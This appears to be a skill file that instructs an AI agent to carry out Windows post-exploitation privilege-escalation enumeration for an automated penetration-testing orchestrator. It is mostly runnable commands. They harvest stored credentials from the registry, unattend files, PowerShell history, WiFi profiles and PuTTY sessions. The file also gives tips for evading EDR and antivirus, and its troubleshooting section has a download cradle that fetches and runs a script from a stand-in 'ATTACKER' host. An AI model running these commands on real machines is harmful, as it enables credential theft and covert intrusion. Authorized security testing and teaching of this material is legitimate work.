---
name: windows-discovery
description: >
  Windows local privilege escalation enumeration and attack surface mapping.
keywords:
  - enumerate privesc
  - check for privilege escalation
  - run winpeas
  - windows privesc
  - local privesc
  - check my privileges
  - escalate on windows
  - what can I escalate
  - post-exploitation windows
tools:
  - WinPEAS
  - PowerUp
  - Seatbelt
  - Watson
  - WES-NG
  - PrivescCheck
  - accesschk
opsec: low
---

# Windows Local Privilege Escalation Discovery

You are helping a penetration tester enumerate a Windows system for local privilege
escalation vectors. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[windows-discovery] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers Windows host discovery — enumerating system configuration,
identifying privilege escalation vectors, and reporting findings to the
orchestrator. When you confirm an exploitable vector — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Detection details (finding type, affected service/binary, evidence)
  - Context for technique execution (hostname, OS version, current user, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

**Do NOT spider or enumerate SMB shares.** Never run `nxc smb`, `spider_plus`,
`manspider`, `smbclient`, or any remote share enumeration tool. Share spidering
is performed from the attackbox by ad-discovery or network-recon — not from
inside a low-privilege shell. If `net share` (the only allowed share command)
reveals a share not already in engagement state, record it as an interim finding
via `add_vuln()` and note it in your return summary. Do not connect to it, read
its contents, or spider it — a different agent handles that from the attackbox.

## State Management

Call `get_state_summary()` from the state-interim MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

### Interim Writes

Write actionable findings **immediately** via state-interim so the orchestrator
can react in real time (via event watcher) instead of waiting for your full
return summary. Use these tools as you discover findings:

- `add_credential()` — cleartext creds in scheduled tasks, registry, config files, PowerShell history, unattend.xml
- `add_vuln()` — confirmed vulnerabilities (unquoted service paths, weak service permissions, AlwaysInstallElevated, HiveNightmare)
- `add_pivot()` — additional NICs/subnets discovered via `ipconfig /all`/`route print`, new hosts from ARP table
- `add_blocked()` — techniques attempted and failed (so orchestrator doesn't re-route)
Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access on a Windows system (cmd.exe, PowerShell, or webshell)
- Know current user context (`whoami`)
- Enumeration tools available on target or transferable

## Step 1: System Information

Gather baseline system information for exploit matching and context.

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
hostname
```

```powershell
[System.Environment]::OSVersion.Version
Get-ComputerInfo | Select-Object CsName, OsName, OsVersion, OsArchitecture, OsBuildNumber, WindowsVersion
wmic os get Caption, Version, BuildNumber, OSArchitecture
```

**Key outputs to note:**
- OS version and build number (determines which exploits/Potatoes work)
- Architecture (x86 vs x64 — affects binary compatibility)
- Hotfix count and list (determines kernel exploit eligibility)
- Domain membership (affects lateral movement options)

**Patch analysis (offline — run on attacker machine):**

```bash
# WES-NG — compare systeminfo against known vulnerabilities
python3 wes.py --update
python3 wes.py systeminfo.txt
```

**Watson (on target — .NET 2.0+):**
```cmd
Watson.exe
```

## Step 2: User Context and Privileges

This is the highest-priority check — token privileges determine immediate escalation paths.

**OPSEC WARNING:** `whoami` and `whoami /priv` are heavily monitored by EDR (CrowdStrike
triggers on these). In OPSEC-sensitive engagements, prefer inferring privileges from
context or using alternative methods:

```powershell
# OPSEC-safe alternatives (less signatured than whoami)
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }

# Check specific privilege without whoami
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")  # Is admin?

# Token privileges via .NET (no whoami.exe process creation)
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class Priv{
    [DllImport("advapi32.dll",SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
    [DllImport("advapi32.dll",SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr t,int c,IntPtr i,int l,out int rl);
}
"@
```

**If OPSEC is not a concern** (CTF, lab, or already detected):

```cmd
whoami /all
whoami /priv
whoami /groups
```

**Infer privileges from context** when possible:
- Running as a Windows service → likely has SeImpersonatePrivilege
- IIS AppPool / MSSQL service → SeImpersonatePrivilege + SeAssignPrimaryTokenPrivilege
- Scheduled task as SYSTEM → full privileges
- Local admin in medium integrity → all privileges present but most disabled (UAC)

**Critical privileges to check:**

| Privilege | Escalation Path |
|-----------|----------------|
| SeImpersonatePrivilege | Potato family → SYSTEM |
| SeAssignPrimaryTokenPrivilege | Potato family → SYSTEM |
| SeDebugPrivilege | Token duplication from SYSTEM process |
| SeBackupPrivilege | Read SAM/SYSTEM hives → hash extraction |
| SeTakeOwnershipPrivilege | Take ownership of any object → modify DACL |
| SeRestorePrivilege | Write any file → DLL hijack / binary replace |
| SeLoadDriverPrivilege | Load vulnerable kernel driver → SYSTEM |
| SeManageVolumePrivilege | Raw volume read → SAM/secrets extraction |

**User and group context:**

```cmd
net user %USERNAME%
net user
net localgroup
net localgroup administrators
```

```powershell
Get-LocalUser | ft Name, Enabled, LastLogon
Get-LocalGroup | ft Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

**Check for privileged group membership** (abuse-able even without admin):
- Backup Operators → SeBackupPrivilege
- DnsAdmins → DLL loading on DC
- Hyper-V Administrators → VM access
- Print Operators → SeLoadDriverPrivilege
- Remote Desktop Users → RDP access
- Remote Management Users → WinRM access
- Event Log Readers → security log access

## Step 3: Services and Processes

Enumerate services for misconfigurations that enable privilege escalation.

```cmd
sc query state= all
wmic service list brief
tasklist /SVC
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
```

**Unquoted service paths:**

```powershell
# PowerUp
Get-ServiceUnquoted -Verbose

# Manual
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```

**Service permissions (writable services):**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
accesschk.exe -ucqv <service_name>
```

**Service binary permissions:**

```cmd
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

```powershell
Get-WmiObject win32_service | Select-Object Name, StartMode, PathName | Where-Object {$_.PathName -notlike "C:\Windows*"} | ForEach-Object { $p = ($_.PathName -split '"')[1]; if($p) { icacls $p } }
```

**Service registry ACLs:**

```powershell
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Users Path Everyone"
```

**Running processes (identify DLL hijacking targets):**

```cmd
tasklist /v
wmic process list full
```

```powershell
Get-Process | Select-Object Name, Id, Path | Where-Object {$_.Path -notlike "C:\Windows\System32\*"} | Sort-Object Path
```

**STOP — write interim findings NOW.** Before continuing to Step 4, call
`add_vuln()` for EACH finding above:
- Unquoted service paths → `add_vuln(title="Unquoted service path: <service>", host="<host>", vuln_type="service-misconfig", severity="medium")`
- Writable service binaries/config → `add_vuln(title="Modifiable service: <service>", host="<host>", vuln_type="service-misconfig", severity="high")`

Any finding here → STOP. Report: hostname, current user, specific findings
(unquoted paths, writable binaries, modifiable services, DLL hijack targets),
OS version. Do not execute exploitation commands inline.

## Step 4: Scheduled Tasks and Autorun

```cmd
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v

wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
```

**Check startup folder permissions:**

```cmd
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

**AlwaysInstallElevated (MSI install as SYSTEM):**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must return `0x1` — if so, STOP. Report: hostname, current user,
AlwaysInstallElevated confirmation, OS version. Do not execute MSI payload
commands inline.

## Step 5: Network and Shares

```cmd
ipconfig /all
route print
arp -a
netstat -ano
net share
```

**Internal-only services (127.0.0.1 listeners):**

```cmd
netstat -ano | findstr LISTENING | findstr 127.0.0.1
```

Look for: databases (3306/5432/1433), web interfaces (8080/8443), management (5985/5986).

**STOP — write interim findings NOW.** Before continuing with SNMP/WiFi/firewall checks:
- Additional NIC found via `ipconfig /all` → call `add_pivot()` NOW
- New hosts from `arp -a` → call `add_pivot()` NOW
- Root/SYSTEM-owned services on localhost → call `add_vuln()` NOW

**SNMP community strings:**

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```

**WiFi passwords:**

```cmd
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

**Firewall rules:**

```cmd
netsh advfirewall firewall show rule name=all
netsh firewall show config
```

## Step 6: Credential Hunting (Quick Scan)

Fast checks for stored credentials before running full harvesting tools.

**Windows Credential Manager:**

```cmd
cmdkey /list
```

If entries found → `runas /savecred /user:<user> cmd.exe`

**Registry credentials:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query HKLM /F "password" /t REG_SZ /S /K 2>nul | findstr /i "password"
reg query HKCU /F "password" /t REG_SZ /S /K 2>nul | findstr /i "password"
```

**Unattend/sysprep files:**

```cmd
dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*sysprep.inf 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul | findstr /i password
```

**IIS web.config:**

```powershell
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul | findstr connectionString
```

**PowerShell history:**

```cmd
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
cat (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern "passw|cred|secret|key|token"
```

**PuTTY/SSH saved sessions:**

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\OpenSSH\Agent\Keys"
```

**HiveNightmare (CVE-2021-36934) — check if exploitable:**

```cmd
icacls C:\Windows\System32\config\SAM
```

If `BUILTIN\Users:(I)(RX)` appears → SAM readable by non-admin users.

**STOP — write interim findings NOW.** Before continuing, call
`add_credential()` for EACH credential found above (registry, unattend files,
PowerShell history, config files, WiFi passwords, SNMP strings). One call per
credential. The orchestrator reacts to these in real time via event watcher.

Any credentials found → STOP. Report: hostname, current user, credential
locations found, OS version. Do not execute credential extraction commands
inline.

## Step 7: Security Controls Detection

```cmd
wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName 2>nul
```

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled
```

**LSASS protection:**

```cmd
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

**Credential Guard:**

```cmd
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v LsaCfgFlags
```

**UAC level:**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

ConsentPromptBehaviorAdmin=0 means UAC disabled. EnableLUA=0 means UAC entirely off.

**AppLocker / WDAC:**

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

## Step 8: Automated Enumeration Tools

When manual checks are insufficient, run comprehensive tools.

**WinPEAS (comprehensive — includes Watson):**

```cmd
winpeas.exe quiet systeminfo userinfo servicesinfo applicationsinfo networkinfo windowscreds
winpeas.exe quiet fast
winpeas.exe quiet log=winpeas_output.txt
```

**PowerUp (PowerSploit):**

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

Key checks: `Get-ServiceUnquoted`, `Get-ModifiableServiceFile`, `Get-ModifiableService`,
`Find-PathDLLHijack`, `Find-ProcessDLLHijack`, `Write-UserAddMSI`.

**Seatbelt (GhostPack):**

```cmd
Seatbelt.exe -group=all -outputfile=seatbelt.txt
Seatbelt.exe -group=system
Seatbelt.exe -group=user
```

**PrivescCheck:**

```powershell
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Extended -Report PrivescCheck_Results -Format HTML
```

**JAWS (PowerShell):**

```powershell
. .\jaws-enum.ps1
```

## Step 9: Return to Orchestrator

STOP and return to the orchestrator with all findings. Present findings ranked
by reliability and OPSEC:

1. Token impersonation (if SeImpersonate — near-certain, low OPSEC)
2. Service/DLL abuse (if writable — reliable, medium OPSEC)
3. Stored credentials (if found — immediate value)
4. UAC bypass (if needed — reliable, low-medium OPSEC)
5. Kernel exploits (last resort — may crash system)

For each finding, pass along: hostname, OS version, current user, integrity
level, specific findings (privileges, services, credentials, patches).

## Troubleshooting

### WinPEAS blocked by AV
Use `winpeas.bat` (batch version) or manual checks from Steps 1-7. SharpUp is a
C# alternative that may evade signature-based detection.

### PowerShell execution restricted
Use `powershell -ep bypass -File script.ps1` or load via download cradle:
`IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')`

### Limited shell (webshell or restricted cmd)
Focus on `whoami /priv`, `systeminfo`, `netstat -ano`, and `reg query` — these work
in most restricted contexts. Transfer WinPEAS binary if file upload available.

### No tools transferable
Manual enumeration using Steps 1-7 covers the most common vectors using only
built-in Windows commands. Focus on `whoami /priv` (Step 2) and service
enumeration (Step 3) as highest-value manual checks.
